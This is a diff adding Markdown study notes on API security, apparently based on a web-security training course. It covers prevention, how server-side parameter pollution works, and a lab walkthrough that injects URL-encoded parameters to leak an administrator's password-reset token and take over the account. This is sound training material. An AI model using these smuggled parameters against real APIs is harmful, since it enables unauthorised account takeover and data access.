@@ -363,4 +363,228 @@ Content-Length: 82
 Let's update `chosen_discount` parameter to `100` and resend the request to solve the lab.
 > NOTE: Check out [walkthrough](apitesting_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+## Preventing vulnerabilities in APIs
 
+To secure an API when designing it make sure that you secure your documentation if it isn't intended for public access, keep it up to date so that legitimate testers have full visibility of the API's attack surface. Apply an allowlist of permitted HTTP methods, validate that the content type is expected for each request or response. Use generic error messages to avoid giving away information that attacker might find useful. Use protective measures on all versions of the API, not just the production version.
+
+To prevent mass assignment vulnerabilities, allowlist the properties that can be updated by the user, and blocklist the sensitive ones that shouldn't be. 
+
+## Server-side parameter pollution
+
+Some systems contain internal APIs that aren't directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. 
+
+This means that an attacker might be able to change or inject parameters, for the purpose of overriding the existing ones, modifying the application behavior or accessing the unauthorized data.
+
+Any user input can be tested for parameter pollution. For example, query parameters, form fields, headers and URL path parameters may all be vulnerable.
+
+> NOTE: This vulnerability is sometimes called HTTP parameter pollution. However, this term is also used to refer to a web application firewall (WAF) bypass technique. To avoid confusion, in this topic we'll only refer to server-side parameter pollution. In addition, despite the similar name, this vulnerability class has very little in common with server-side prototype pollution.
+
+## Testing for server-side parameter pollution in the query string
+
+To test for server-side parameter pollution in the query string, place query syntax characters like `#`, `&`, and `=` in your input and observe how the application responds. 
+
+If a vulnerable application enables you to search for other users based on their username, when searching for a user, the browser makes a following request: `GET /userSearch?name=peter&back=/home`.
+
+To retrieve user information, the server queries an internal API with the following request: `GET /users/search?name=peter&publicProfile=true`.
+
+### Truncating query strings
+
+We can use a URL encoded version of `#` character to attempt to truncate the server-side request. To help interpret the response, we can also add a string after it, like in the following request:
+
+```
+GET /userSearch?name=peter%23foo&back=/home
+```
+
+`%23` is a URL encoded `#` character. The front-end will try to access the following URL decoding this character:
+
+```
+GET /users/search?name=peter#foo&publicProfile=true
+```
+
+> NOTE: It's essential that the `#` character is URL encoded, because otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.
+
+If the response returns the user `peter`, the server-side query may have been truncated. If an `Invalid name` error message is returned, the application may have treated `foo` as part of the username. This suggests that the server-side request may not have been truncated. 
+
+If you are able to truncate the server-side request, this removes the requirement for `publicProfile` field to be set to true. You maybe able to exploit this to return non-public user profiles.
+
+### Injecting invalid parameters
+
+You can use a URL-encoded `&` character to attempt to add a second parameter to the server-side request, like in the following request:
+
+```
+GET /userSearch?name=peter%26foo=xyz&back=/home
+```
+
+`%26` is URL encoded `&` character and as a result the following server-side request is made to the internal API:
+
+```
+GET /users/search?name=peter&foo=xyz&publicProfile=true
+```
+
+If the response is unchanged, this may indicate that the parameter was successfully injected, but ignored by the application. Further testing is needed to build a more complete picture. 
+
+### Injecting valid parameters
+
+If query string can be modified, then second valid parameter can also be added to the server-side request. We already discussed how to [find hidden parameters](#finding-hidden-parameters). For example, if we have identified an `email` parameter, we could add it to the query string as follows:
+
+```
+GET /userSearch?name=peter%26email=foo&back=/home
+```
+
+The following server-side request is made to the internal API as a result:
+
+```
+GET /users/search?name=peter&email=foo&publicProfile=true
+```
+
+### Overriding existing parameters
+
+To confirm whether the application is vulnerable to server-side parameter pollution, you could try to override the original parameter by injecting a second parameter with the same name but different value. It can be done as follows:
+
+```
+GET /userSearch?name=peter%26name=carlos&back=/home
+```
+
+This results in the following server-side request to the internal API:
+
+```
+GET /users/search?name=peter&name=carlos&publicProfile=true
+```
+
+The internal API now has to interpret two `name` parameters and depending on how the application processes the second parameter, the API could be severely impacted.
+
+For example:
+
+- PHP parses the last parameter only, so the user search would return `carlos`.
+- ASP.NET combines the parameters, which might return an `Invalid username` error message.
+- Node.js parses the first parameter only. This would return user `peter`, thereby not changing anything.
+
+If we are able to override the original parameter however, we may be able to conduct an exploit by adding, for example, `name=administrator` to the request. This may enable us to log in as the administrator user.
+
+### Lab: Exploiting server-side parameter pollution in a query string
+
+In Burp Suite's browser navigate to the lab URL and trigger a password reset for the administrator user by going to _My account_ > _Forgot password_ > Fill in _administrator_ > and click _Submit_.
+
+In __Proxy__ > __HTTP history__ there are `POST /forgot-password` request and a related `/static/js/forgotPassword.js` JavaScript file. Right-click the first one and __Send to Repeater__. Resend the request to make sure that the response is consistent:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 49
+
+{
+  "result":"*****@normal-user.net",
+  "type":"email"
+}
+```
+
+Let's change the value of the username parameter from `administrator` to a non-existent `administratorx` username. Send the request, the result will be an `Invalid username` error message:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 61
+
+{
+  "type":"ClientError",
+  "code":400,
+  "error":"Invalid username."
+}
+```
+
+Let's try to add a second parameter-value pair to the server-side request using a URL-encoded `&` character, for example: `username=administrator%26x=y` and send the request:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 40
+
+{
+  "error": "Parameter is not supported."
+}
+```
+
+This suggests that the internal API has indeed interpreted `&x=y` as a separate parameter and not as a part of the username. This time let's truncate the server-side query string using URL-encoded `#` character, for example `username=administrator%23` and send the request:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 33
+
+{
+  "error": "Field not specified."
+}
+```
+
+This might suggest that there is an additional parameter named `field` included in this query, which has been removed by the `#` character. Now let's add a URL encoded `&` followed by `field=x` and URL encoded `#` at the end, to see what it yields:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 58
+
+{
+  "type":"ClientError",
+  "code":400,
+  "error":"Invalid field."
+}
+```
+
+Let's try to brute-force the `field` parameter using Burp Suite Intruder. Right click the `POST /forgot-password` request and click __Send to Intruder__.
+
+- In the __Intruder__ tab, add a payload position to the value of the field parameter as follows: `username=administrator%26field=§x§%23`
+- Download a __Server-side variable names__ payload list from [here](https://raw.githubusercontent.com/antichown/burp-payloads/refs/heads/master/Server-side%20variable%20names.pay).
+- In the __Payloads__ side panel, under _Payload configuration_, click __Load__, select the downloaded "__Server-side variable names__" payload list and start the attack.
+- Review the results and look for requests with `200` status code in the response.
+
+It seems like values `email` and `username` for the parameter `field` return status code `200`:
+
+![Burp Suite Intruder Attack](psa_apitesting_ss02.png "Intruder Attack")
+
+Go back to the __Repeater__ tab and modify the request body as follows: `username=administrator%26field=email%23`, send the request. Notice that this returns the original respons, which means that `email` is a valid field type. 
+
+Now review the `/static/js/forgotPassword.js` JavaScript file in __Proxy__ > __HTTP history__. There is a password reset endpoint that refers to a `reset_token` parameter:
+
+```javascript
+forgotPwdReady(() => {
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const resetToken = urlParams.get('reset-token');
+    if (resetToken)
+    {
+        window.location.href = `/forgot-password?reset_token=${resetToken}`;
+    }
+    else
+    {
+        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
+        forgotPasswordBtn.addEventListener("click", displayMsg);
+    }
+});
+```
+
+In the Repeater tab, let's change the value of the `field` parameter from `email` to `reset_token`: `username=administrator%26field=reset_token%23` and send the request:
+
+_Response:_
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 66
+
+{
+  "type":"reset_token",
+  "result":"0lr94kuobxmwi8micj027rs6ao4x6jrh"
+}
+```
+
+Now in the Burp Browser to the password reset endpoint `/forgot-password` add `?reset_token=0lr94kuobxmwi8micj027rs6ao4x6jrh` and set a new password. Log in as the administrator user using the new password, go to __Admin panel__ and delete `carlos` to solve the lab.
+
+> NOTE: Check out [walkthrough](apitesting_lab04_zaproxy.md) of this lab in OWASP Zed Attack Proxy
